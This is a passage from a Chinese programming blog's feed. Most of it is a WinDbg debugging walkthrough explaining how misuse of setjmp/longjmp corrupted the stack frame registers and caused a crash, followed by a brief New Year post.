class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">(12dc.3570): Unknown exception - code c0000029 (!!! second chance !!!)</span><br><span class="line">eax=00c1f9c0 ebx=00c1fe70 ecx=00c20000 edx=00c1d000 esi=00b0107d edi=00c1fd5c</span><br><span class="line">eip=774d341f esp=00c1f9a0 ebp=00c1fd3c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246</span><br><span class="line">ntdll!RtlUnwind+0x3c52f:</span><br><span class="line">774d341f 8b4c240c        mov     ecx,dword ptr [esp+0Ch] ss:002b:00c1f9ac=00c20000</span><br><span class="line"></span><br><span class="line">0:000&gt; g</span><br><span class="line">WARNING: Continuing a non-continuable exception</span><br><span class="line">(12dc.3570): Unknown exception - code c0000029 (first chance)</span><br><span class="line">(12dc.3570): Unknown exception - code c0000029 (!!! second chance !!!)</span><br><span class="line">eax=00c1f9c0 ebx=00c1fedc ecx=00c20000 edx=00c1d000 esi=00b0107d edi=00c1fd5c</span><br><span class="line">eip=774d341f esp=00c1f9a0 ebp=00c1fd3c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246</span><br><span class="line">ntdll!RtlUnwind+0x3c52f:</span><br><span class="line">774d341f 8b4c240c        mov     ecx,dword ptr [esp+0Ch] ss:002b:00c1f9ac=00c20000</span><br><span class="line"></span><br><span class="line">0:000&gt; g</span><br><span class="line">WARNING: Continuing a non-continuable exception</span><br><span class="line">(12dc.3570): Unknown exception - code c0000029 (first chance)</span><br><span class="line">(12dc.3570): Unknown exception - code c0000029 (!!! second chance !!!)</span><br><span class="line">eax=00c1f9c0 ebx=00c1fef4 ecx=00c20000 edx=00c1d000 esi=00b0107d edi=00c1fd5c</span><br><span class="line">eip=774d341f esp=00c1f9a0 ebp=00c1fd3c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246</span><br><span class="line">ntdll!RtlUnwind+0x3c52f:</span><br><span class="line">774d341f 8b4c240c        mov     ecx,dword ptr [esp+0Ch] ss:002b:00c1f9ac=00c20000</span><br><span class="line"></span><br><span class="line">0:000&gt; g</span><br><span class="line">WARNING: Continuing a non-continuable exception</span><br><span class="line">(12dc.3570): Unknown exception - code 80000026 (!!! second chance !!!)</span><br><span class="line">eax=00000000 ebx=00000000 ecx=00000000 edx=00000000 esi=00000000 edi=00000000</span><br><span class="line">eip=00b01ffe esp=00c1fd54 ebp=00c1fdec iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206</span><br><span class="line">Test!___longjmp_internal+0x4e:</span><br><span class="line">00b01ffe 5e              pop     esi</span><br><span class="line"></span><br><span class="line">0:000&gt; g</span><br><span class="line">(12dc.3570): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=00b0107d ebx=c483ffff ecx=1b2b3725 edx=00000000 esi=e8a2110c edi=00000000</span><br><span class="line">eip=00b0263e esp=00c1fd2c ebp=00c1fdec iopl=0         nv up ei pl nz ac pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216</span><br><span class="line">Test!__local_unwind2+0x48:</span><br><span class="line">00b0263e 8b0cb3          mov     ecx,dword ptr [ebx+esi*4] ds:002b:670c442f=????????</span><br></pre></td></tr></table></figure><p>如果给 <code>foo</code> 函数下断点，只会命中一次，而如果给 <code>bar</code> 函数下断点，则会命中多次，这很好理解。如果在 <code>foo</code> 函数中给局部变量 <code>value</code> 下内存读写断点，该断点只会命中一次（在变量被初始化为 <code>0</code> 的时候）。理论上来说，进入函数 <code>bar</code> 时，传入的参数 <code>value</code> 的值应该总是 <code>0</code> ，但是实际上并非如此，而且我们在 <code>foo</code> 函数中下的内存断点也无法监控到 <code>value</code> 的值的<strong><em>改变</em></strong>，在 WinDbg 中可以进行验证：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">$$ 分别给两个函数下断点</span><br><span class="line">0:000&gt; bu Test!foo</span><br><span class="line">0:000&gt; bu Test!bar</span><br><span class="line"></span><br><span class="line">$$ 继续运行被调试程序，等待第一个断点命中，进入 foo 函数</span><br><span class="line">0:000&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=012062d0 ebx=00c6c000 ecx=00000000 edx=c7664979 esi=00b19df0 edi=01203948</span><br><span class="line">eip=00b010a0 esp=00eff838 ebp=00eff880 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202</span><br><span class="line">Test!foo:</span><br><span class="line">00b010a0 55              push    ebp</span><br><span class="line"></span><br><span class="line">$$ 等待栈帧建立完毕</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=012062d0 ebx=00c6c000 ecx=00000000 edx=c7664979 esi=00b19df0 edi=01203948</span><br><span class="line">eip=00b010a1 esp=00eff834 ebp=00eff880 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202</span><br><span class="line">Test!foo+0x1:</span><br><span class="line">00b010a1 8bec            mov     ebp,esp</span><br><span class="line"></span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=012062d0 ebx=00c6c000 ecx=00000000 edx=c7664979 esi=00b19df0 edi=01203948</span><br><span class="line">eip=00b010a3 esp=00eff834 ebp=00eff834 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202</span><br><span class="line">Test!foo+0x3:</span><br><span class="line">00b010a3 83ec48          sub     esp,48h</span><br><span class="line"></span><br><span class="line">$$ 局部变量 value 存放于 ebp-48 处，下内存读写断点监控</span><br><span class="line">0:000&gt; ba w4 ebp-48</span><br><span class="line"></span><br><span class="line">0:000&gt; bl</span><br><span class="line">     0 e Disable Clear  00b010a0     0001 (0001)  0:**** Test!foo</span><br><span class="line">     1 e Disable Clear  00b01040     0001 (0001)  0:**** Test!bar</span><br><span class="line">     2 e Disable Clear  00eff7ec w 4 0001 (0001)  0:**** </span><br><span class="line"></span><br><span class="line">$$ 继续执行，value 初始化时第一次命中内存断点</span><br><span class="line">0:000&gt; g</span><br><span class="line">Breakpoint 2 hit</span><br><span class="line">eax=00eff7f0 ebx=00c6c000 ecx=00000000 edx=c7664979 esi=00b19df0 edi=01203948</span><br><span class="line">eip=00b010ba esp=00eff7ec ebp=00eff834 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206</span><br><span class="line">Test!foo+0x1a:</span><br><span class="line">00b010ba 6a00            push    0</span><br><span class="line"></span><br><span class="line">0:000&gt; ub eip L1</span><br><span class="line">Test!foo+0x13 [c:\users\test\source\repos\test\test\test.cpp @ 27]:</span><br><span class="line">00b010b3 c745b800000000  mov     dword ptr [ebp-48h],0</span><br><span class="line"></span><br><span class="line">$$ 继续执行，第一次命中 bar 函数</span><br><span class="line">0:000&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">eax=00eff7f0 ebx=00c6c000 ecx=00000000 edx=00eff7f0 esi=00b19df0 edi=01203948</span><br><span class="line">eip=00b01040 esp=00eff7e0 ebp=00eff834 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246</span><br><span class="line">Test!bar:</span><br><span class="line">00b01040 55              push    ebp</span><br><span class="line"></span><br><span class="line">$$ 传入的 value 参数的值为 0</span><br><span class="line">0:000&gt; dd esp L3</span><br><span class="line">00eff7e0  00b010f1 00eff7f0 00000000</span><br><span class="line"></span><br><span class="line">$$ 继续执行，第二次命中 bar 函数</span><br><span class="line">0:000&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">eax=00eff798 ebx=00b010c2 ecx=00000014 edx=00eff7f0 esi=00b19df0 edi=01203948</span><br><span class="line">eip=00b01040 esp=00eff7cc ebp=00eff7dc iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246</span><br><span class="line">Test!bar:</span><br><span class="line">00b01040 55              push    ebp</span><br><span class="line"></span><br><span class="line">$$ 传入的 value 参数的值为 0x20!!!</span><br><span class="line">0:000&gt; dd esp L3</span><br><span class="line">00eff7cc  00b010f1 00eff798 00000020</span><br></pre></td></tr></table></figure><p>的确，这里 <code>ba</code> 内存断点只命中了一次，但是第二次命中 <code>bar</code> 函数时，参数 <code>value</code> 的值却改变了，难道这是 WinDbg 的 Bug 吗？事实上并不是，而是 <code>bar</code> 函数中直接跳转到 <code>jmp_buf</code> 中的 <code>eip</code> 的写法是有问题的！</p><p>当从 <code>foo</code> 进入 <code>bar</code> 时，<code>bar</code> 函数也会建立栈帧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; u Test!bar</span><br><span class="line">Test!bar [c:\users\test\source\repos\test\test\test.cpp @ 7]:</span><br><span class="line">00b01040 55              push    ebp</span><br><span class="line">00b01041 8bec            mov     ebp,esp</span><br></pre></td></tr></table></figure><p>而之后在 <code>bar</code> 函数中又直接跳转到 <code>jmp_buf</code> 中的 <code>eip</code> ，此时 <code>esp</code> 和 <code>ebp</code> 寄存器的值没有被恢复，就直接回到了 <code>foo</code> 函数中。因为局部变量 <code>value</code> 是基于 <code>ebp</code> 进行定位的，而此时 <code>ebp</code> 的值已经变了，以至于 <code>foo</code> 再次调用 <code>bar</code> 时，<code>value</code> 不再是原来的 <code>value</code> ，而内存断点监控的仍然是原来存放 <code>value</code> 变量的地址（原有地址上的值也并未改变），因此自然不会再次命中，也无法监控到 <code>value</code> 的值的<strong><em>改变</em></strong> （改变只是由于 <code>ebp</code> 发生了变化从而读取到了栈上存储的其他值）。</p><p>同样，<code>bar</code> 函数的第一个参数 <code>env</code> 所存储的值也会因为 <code>foo</code> 函数中 <code>ebp</code> 的变化而变化，当传递一个非法的 <code>env</code> 给 <code>longjmp</code> 时，进程直接 Crash 掉了。</p><p>本小节给出的示例程序，完全是 <code>setjmp</code> 和 <code>longjmp</code> 的一种错误用法，这两个函数应该配套使用，而不应该在中间某个地方直接通过 <code>jmp</code> 或者 <code>call</code> 来跳转到 <code>setjmp</code> 之后的位置。这里给出的示例程序是实际调试过程中遇到的问题的一个简化模型，仅供调试学习之用，读者切勿模仿这里的错误写法。</p><h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04. 小结"></a>0x04. 小结</h2><p>本文通过分析一个 Crash 学习了 <code>setjmp</code> 和 <code>longjmp</code> 的基本用法，并分析清楚了造成 Crash 的根本原因。</p><p>除了异常处理之外， <code>setjmp</code> 和 <code>longjmp</code> 还有一些其他场合的应用，比如实现 <a href="https://zh.wikipedia.org/wiki/%E5%8D%8F%E7%A8%8B#%E7%94%A8C%E7%9A%84%E5%AE%9E%E7%8E%B0" target="_blank" rel="noopener">协程</a> 等，具体可以参考 <a href="https://stackoverflow.com/questions/14685406/practical-usage-of-setjmp-and-longjmp-in-c" target="_blank" rel="noopener">StackOverflow</a> 上的提问。</p><p>最后，基于 <code>setjmp</code> 和 <code>longjmp</code> 还可以实现一定程度的代码混淆（反分析、反调试），这个问题留给读者自行思考和实践。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-问题描述&quot;&gt;&lt;a href=&quot;#0x01-问题描述&quot; class=&quot;headerlink&quot; title=&quot;0x01. 问题描述&quot;&gt;&lt;/a&gt;0x01. 问题描述&lt;/h2&gt;&lt;p&gt;周末在测试一个程序时，发现其莫名其妙的 Crash 在了一个系统自带 DLL 的某个函数里面，而且很难直观地看出来 Crash 的原因，分析之后发现是不当使用 C 语言 &lt;code&gt;setjmp&lt;/code&gt; 和 &lt;code&gt;longjmp&lt;/code&gt; 两个函数导致的。那么这和文章标题有什么联系呢？笔者在分析的过程中使用了 WinDbg 的内存断点（ Processor Breakpoint / Data Breakpoint ）来跟踪一个栈变量的读写操作，理论上这个断点会多次命中，但实际上只命中了一次，而这个现象正是由于不当使用 &lt;code&gt;setjmp&lt;/code&gt; 和 &lt;code&gt;longjmp&lt;/code&gt; 导致 &lt;code&gt;esp&lt;/code&gt; 和 &lt;code&gt;ebp&lt;/code&gt; 寄存器的值的非预期改变所导致的。&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="http://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="WinDbg" scheme="http://programlife.net/tags/WinDbg/"/>
    
      <category term="内存断点" scheme="http://programlife.net/tags/%E5%86%85%E5%AD%98%E6%96%AD%E7%82%B9/"/>
    
      <category term="setjmp" scheme="http://programlife.net/tags/setjmp/"/>
    
      <category term="longjmp" scheme="http://programlife.net/tags/longjmp/"/>
    
  </entry>
  
  <entry>
    <title>Hello 2019</title>
    <link href="http://programlife.net/2019/01/01/hello-2019/"/>
    <id>http://programlife.net/2019/01/01/hello-2019/</id>
    <published>2019-01-01T15:12:44.000Z</published>
    <updated>2019-01-01T15:34:39.040Z</updated>
    
    <content type="html"><![CDATA[<p>May you always have beginner’s mind.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;May you always have beginner’s mind.&lt;/p&gt;

      
    
    </summary>
    
      <category term="Default" scheme="http://programlife.net/categories/Default/"/>
    
    
      <category term="New Year" scheme="http://programlife.net/tags/New-Year/"/>
    
  </entry>
  
</feed>
